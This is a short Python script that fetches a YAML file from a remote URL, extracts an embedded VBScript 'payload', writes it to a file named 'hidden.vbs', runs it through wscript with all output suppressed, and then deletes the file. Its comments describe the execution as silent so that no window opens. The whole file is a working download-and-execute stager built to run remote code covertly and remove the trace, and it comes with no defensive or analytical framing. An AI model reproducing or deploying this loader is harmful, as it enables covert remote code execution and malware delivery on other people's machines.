import yaml
import requests
import subprocess
import os


"Network drive YAML file payload"
YAML_URL = ""


def fetch_yaml(url):
    """Fetches and parses YAML from the given URL."""
    response = requests.get(url, timeout=10)
    response.raise_for_status()
    return yaml.safe_load(response.text)


def execute_vbs_silently(payload):
    """Executes the VBScript silently to avoid opening any window."""
    vbs_script = payload.get("vbs_script")
    if vbs_script:

        try:
            print("[*] Executing VBScript silently...")

            with open("hidden.vbs", "w") as vbs_file:
                vbs_file.write(vbs_script)

            subprocess.run(
                ["wscript", "hidden.vbs"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            os.remove("hidden.vbs")

        except Exception as e:
            print(f"Error executing VBScript: {e}")


def main():
    """Main function to load and execute VBScript from YAML."""
    try:
        yaml_data = fetch_yaml(YAML_URL)
        execute_vbs_silently(yaml_data.get("payload", {}))
    except Exception as e:
        print(f"Failed to execute payload: {e}")


if __name__ == "__main__":
    main()
